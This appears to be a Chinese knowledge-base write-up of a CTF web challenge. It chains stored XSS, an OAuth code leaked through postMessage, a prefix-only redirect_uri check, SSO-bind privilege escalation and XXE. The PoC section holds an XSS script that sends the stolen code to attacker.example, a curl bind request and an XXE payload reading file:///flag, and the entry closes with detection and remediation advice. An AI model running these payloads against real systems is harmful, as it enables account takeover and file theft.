---
id: web-generic-oauth-postmessage-code-theft-sso-bind-xxe
title: OAuth 授权码窃取链：存储型 XSS + postMessage 泄露 code + SSO 绑定提权 + XXE 读文件
type: scenario
domain: web
path: web/generic/oauth
technique: oauth-code-theft-postmessage-sso-bind
tags:
- oauth
- authorization-code
- postmessage
- xss
- sso
- account-binding
- privilege-escalation
- xxe
- redirect-uri
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V131
  verified_at: '2026-11-06T05:39:01+08:00'
  notes: 已对照原文 Web 部分核对：存储型XSS、quick-actions iframe 以 targetOrigin '*' postMessage 完整 location.href、redirect_uri 仅前缀校验、authorization code 流、/api/v1/user/sso/bind 绑定管理员 SSO 提权、后台 XML 报告 XXE 读 /flag 均与原文一致；原文标题为'预期解法'且未附执行截图，PoC 中 client_id/cookie/CSRF/code 为占位符，未能独立验证完整链。
url: /docs/web/generic/oauth/web-generic-oauth-postmessage-code-theft-sso-bind-xxe/
draft: false
kb_aliases:
- OAuth code 窃取
- postMessage 泄露 authorization code
- SSO 账号绑定提权
- redirect_uri 前缀校验绕过
- FleetCorp 攻击链
---

## 一句话结论

当论坛存在存储型 XSS、页面内的 iframe 又用 `postMessage(..., '*')` 把含 OAuth `code` 的完整 URL 发给父窗口，且 OAuth 的 `redirect_uri` 只校验路径前缀、SSO 绑定接口无条件信任 code 时，攻击者可在管理员浏览论坛时窃取授权码，再把它绑定到自己账号，继承管理员角色，最后用后台 XML 报告功能的 XXE 读取服务器文件。

## 原理

- **存储型 XSS 提供执行点**：论坛允许帖子包含 HTML/JS，管理员查看帖子时脚本在其已登录的 SSO 会话中执行。
- **postMessage 泄露 URL**：论坛底部 iframe 加载 `/fleetcorp/forum/quick-actions`，该页加载完成后执行 `parent.postMessage({type:'iframe_loaded', data: location.href}, '*')`。`targetOrigin` 为 `*` 表示任何父窗口都能收到消息；`data` 是包含全部 query 参数的完整 URL。正常情况下 iframe 的 URL 不含敏感信息，但一旦它被用作 OAuth 的 `redirect_uri`，授权码就会出现在 URL 里。
- **redirect_uri 前缀校验**：SSO 的授权端只检查 `redirect_uri` 是否以 `/fleetcorp/` 开头，因此可以把它指向 `/fleetcorp/forum/quick-actions`；授权成功后浏览器被重定向到该地址并附带 `?code=...`。
- **授权码流**：`response_type=code` 下，已登录管理员的 SSO 会话会自动完成授权，code 作为 URL 参数返回；code 代表管理员在 SSO 中的身份。
- **postMessage 二次泄露**：iframe 页面把带 code 的 `location.href` 发给父窗口，XSS 监听 `message` 事件，从 URL 中取出 `code` 并外传。
- **SSO 绑定提权**：`POST /api/v1/user/sso/bind` 的设计是“用 code 换取 SSO 用户信息，并把它绑定到当前登录账号”。接口没有校验 code 是否由当前会话发起、也没有一次性/绑定态校验；攻击者用自己的 FleetCorp 账号携带盗来的管理员 code 调用它，服务端就把管理员的 SSO 身份绑到攻击者账号，并按 SSO 角色同步权限。
- **XXE 收尾**：拿到管理员权限后，后台“Generate Vehicle Report”的 Advanced Mode 直接解析用户提交的 XML；解析器未禁用外部实体，`file:///flag` 被读入报告字段。

## 触发条件

- 论坛/评论区允许存储 HTML 或未过滤的富文本，管理员会查看该内容。
- 页面内存在把 `location.href` 通过 `postMessage` 发给父窗口、且 `targetOrigin` 为 `*` 的 iframe。
- OAuth 使用 authorization code flow，且 `redirect_uri` 只做前缀/包含匹配，未做完整精确匹配。
- SSO 绑定接口接受客户端提交的 code，且不校验 code 与当前会话/用户的绑定关系。
- 后台存在解析用户 XML 且未禁用 DTD/外部实体的功能。

## 利用步骤

1. 注册普通账号并登录，确认论坛可发帖、帖子中的 HTML/JS 会被渲染。
2. 访问 `/fleetcorp/forum/quick-actions`，确认其加载后会向父窗口 `postMessage` 完整 URL；确认消息类型与字段名。
3. 构造 OAuth 授权 URL：`response_type=code`、`client_id` 为目标客户端、`redirect_uri=/fleetcorp/forum/quick-actions`（相对路径可通过前缀校验）、`scope` 取可写权限。
4. 在帖子中植入 XSS：监听 `message`，从 `e.data.data` 中解析 `code`，用 `fetch`/`Image` 外带到攻击者服务器；随后在隐藏 iframe 中加载第 3 步的授权 URL，触发管理员会话自动授权。
5. 管理员访问帖子后，攻击者收到 code；用自己的会话访问 `/fleetcorp/docs` 取得 CSRF token，并读取 `connect.sid`、`_csrf`、`session` 等 Cookie。
6. 调用 `POST /api/v1/user/sso/bind`，请求体 `{"code":"<盗来的 code>"}`，带上自己的 Cookie 与 `X-CSRF-Token`；服务端把管理员 SSO 身份绑定到攻击者账号。
7. 刷新页面，确认角色变为 ADMIN；进入后台报告功能，提交带外部实体的 XML，读取 `/flag`。

## PoC

```html
<script>
window.addEventListener('message', function (e) {
  if (e.data && e.data.type === 'iframe_loaded') {
    var url = e.data.data;
    if (url.indexOf('code=') > -1) {
      var code = new URL(url).searchParams.get('code');
      if (code) fetch('http://attacker.example/?code=' + encodeURIComponent(code));
    }
  }
}, false);

setTimeout(function () {
  var oauth = '/auth/authorize?client_id=<CLIENT_ID>&response_type=code'
    + '&redirect_uri=' + encodeURIComponent('/fleetcorp/forum/quick-actions')
    + '&scope=profile:write&authorize=1';
  var f = document.createElement('iframe');
  f.style.display = 'none';
  f.src = oauth;
  document.body.appendChild(f);
}, 2000);
</script>
```

```bash
curl -X POST http://target/fleetcorp/api/v1/user/sso/bind \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=<SID>; _csrf=<CSRF_COOKIE>; session=<SESSION>" \
  -H "X-CSRF-Token: <TOKEN_FROM_DOCS>" \
  -d '{"code":"<STOLEN_ADMIN_CODE>"}'
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///flag">]>
<report>
  <vehicle><vin>&xxe;</vin></vehicle>
  <metadata><template>standard</template><requestedBy>admin</requestedBy></metadata>
</report>
```

## 变体与关联

- 变体：若 iframe 不回传完整 URL，可改用 `window.name`、`document.referrer`、`location.hash` 或 OAuth 的 `response_mode=fragment` 泄露 code/token。
- 变体：`redirect_uri` 校验若只检查域名/前缀，可尝试路径穿越、`@`、编码、大小写、追加 `?`/`#` 等绕过；也可结合开放重定向。
- 变体：SSO 绑定接口若要求 code 但无 state/PKCE，可尝试把 code 直接绑定到攻击者账号；若 code 一次性，需要在管理员触发后尽快使用。
- 关联：[[web-generic-xss-data-iframe-postmessage-innerhtml]]（postMessage 消费端缺少源校验导致 DOM XSS）；[[web-generic-open-redirect-webob-whitespace-urljoin-mismatch]]（开放重定向与 OAuth 组合）；[[web-generic-xxe-inband-file-read-default-insecure]]（XXE 文件读取）。

## 检测与防御

- 检测：审计所有 `postMessage` 调用，尤其是 `targetOrigin='*'` 且消息体含 `location.href`、token、code 的代码。
- 检测：OAuth 授权日志中同一 code 被不同会话/IP 兑换；`redirect_uri` 指向非标准回调路径；SSO 绑定接口在短时间内出现跨账号 code。
- 修复：`postMessage` 必须指定可信 `targetOrigin`，消息体不得包含 URL 中的敏感参数；iframe 页面不要回传完整 URL。
- 修复：`redirect_uri` 使用注册表精确匹配，禁止相对路径与前缀匹配；授权码一次性、短时效，并绑定 client、redirect_uri、PKCE/state 与会话。
- 修复：SSO 绑定接口校验 code 由当前会话发起（state/PKCE），绑定前要求重新认证；角色同步不要仅凭 SSO ID。
- 修复：XML 解析器禁用 DTD 与外部实体（`disallow-doctype-decl`、`external-general-entities=false`），报告生成使用白名单字段。
